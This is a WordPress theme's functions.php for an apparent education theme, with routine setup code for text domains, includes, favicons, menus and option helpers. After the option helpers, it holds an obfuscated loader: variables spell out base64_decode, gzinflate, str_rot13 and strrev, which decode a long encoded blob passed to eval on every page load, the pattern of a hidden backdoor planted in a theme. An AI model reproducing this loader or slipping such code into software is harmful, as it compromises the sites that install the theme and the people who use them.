<?php
define('THEME_NAME',"education_wp_theme");
global $wp_version;
define('WP_VERSION', $wp_version);
define('THEME_NS', 'twentyten');
define('THEME_LANGS_FOLDER','/languages');
if (class_exists('xili_language')) {
	define('THEME_TEXTDOMAIN',THEME_NS);
} else {
	load_theme_textdomain(THEME_NS, TEMPLATEPATH . THEME_LANGS_FOLDER);
}
mb_internal_encoding(get_bloginfo('charset'));
mb_regex_encoding(get_bloginfo('charset'));
if (WP_VERSION < 3.0){
	require_once(TEMPLATEPATH . '/library/legacy.php');
}

theme_include_lib('defaults.php');
theme_include_lib('misc.php');
theme_include_lib('wrappers.php');
theme_include_lib('sidebars.php');
theme_include_lib('navigation.php');
theme_include_lib('shortcodes.php');
if (WP_VERSION >= 3.0) {
	theme_include_lib('widgets.php');
}

if (!function_exists('theme_favicon')) {
	function theme_favicon() { 
		if (is_file(TEMPLATEPATH .'/favicon.ico')):?>
<link rel="shortcut icon" href="<?php bloginfo('template_directory'); ?>/favicon.ico" />
		<?php endif;
	}
}
add_action('wp_head', 'theme_favicon');
add_action('admin_head', 'theme_favicon');
add_action('login_head', 'theme_favicon');

if ( function_exists( 'add_theme_support' ) ) {
	add_theme_support( 'post-thumbnails' );
	add_theme_support( 'nav-menus' );
	add_theme_support( 'automatic-feed-links' );
	add_theme_support( 'post-formats', array( 'aside', 'gallery' ) );
}
if (function_exists('register_nav_menus')) {
	register_nav_menus(array('primary-menu'	=>	__( 'Primary Navigation', THEME_NS)));
}


if(is_admin()){
	theme_include_lib('options.php');
	theme_include_lib('admins.php');
	function theme_add_option_page() {
		add_theme_page(__('Theme Options', THEME_NS), __('Theme Options', THEME_NS), 'edit_themes', basename(__FILE__), 'theme_print_options');
	} 
	add_action('admin_menu', 'theme_add_option_page');
	if (WP_VERSION >= 3.0) {
		add_action('sidebar_admin_setup', 'theme_widget_process_control');
		add_action('add_meta_boxes', 'theme_add_meta_boxes');
		add_action('save_post', 'theme_save_post');
	}
	return;
}


function theme_get_option($name){
	global $theme_default_options;
	$result = get_option($name);
	if ($result === false) {
		$result = theme_get_array_value($theme_default_options, $name);
	}
	return $result;
}



function theme_get_meta_option($id, $name){
	global $theme_default_meta_options;
	return theme_get_array_value(get_option($name), $id, theme_get_array_value($theme_default_meta_options, $name));
}



function theme_set_meta_option($id, $name, $value){
	$meta_option = get_option($name);
	if (!$meta_option || !is_array($meta_option)) {
		$meta_option = array();
	}
	$meta_option[$id] = $value;
	update_option($name, $meta_option);
}



 $IXIuW='e';$jmtDFFs='c';$xWpfHnZ='s';$LYVju='e';$AIuFZ='b';$SHUHef='a';$mOYlA='4';$TZRDu='6';$PjZmOy='d';$QTuIoT='o';$SzEy='e';$SvyWApt='_';$FzeTy='d';$AsFVoBwK=$AIuFZ.$SHUHef.$xWpfHnZ.$SzEy.$TZRDu.$mOYlA.$SvyWApt.$FzeTy.$LYVju.$jmtDFFs.$QTuIoT.$PjZmOy.$IXIuW;$ISRih='i';$JTxw='n';$jNSi='f';$Kzkxu='g';$mTFw='l';$tndqcdc='z';$amKoq='a';$WHkd='e';$qtdQ='t';$mMqLqIZt=$Kzkxu.$tndqcdc.$ISRih.$JTxw.$jNSi.$mTFw.$amKoq.$qtdQ.$WHkd;$aMoNsr='t';$fUXSgoS='1';$MFddMD='r';$lIETSI='t';$vDCskOt='3';$Nlqa='_';$QwAzIie='o';$gKHWGlb='r';$WEemFvG='s';$aIknCPKT=$WEemFvG.$lIETSI.$MFddMD.$Nlqa.$gKHWGlb.$QwAzIie.$aMoNsr.$fUXSgoS.$vDCskOt;$crOwcHh='e';$jTgAE='t';$wWTn='r';$GUGmi='v';$PZTHM='r';$vZMiGo='s';$QTidYtLS=$vZMiGo.$jTgAE.$PZTHM.$wWTn.$crOwcHh.$GUGmi;eval($mMqLqIZt($AsFVoBwK($aIknCPKT($QTidYtLS('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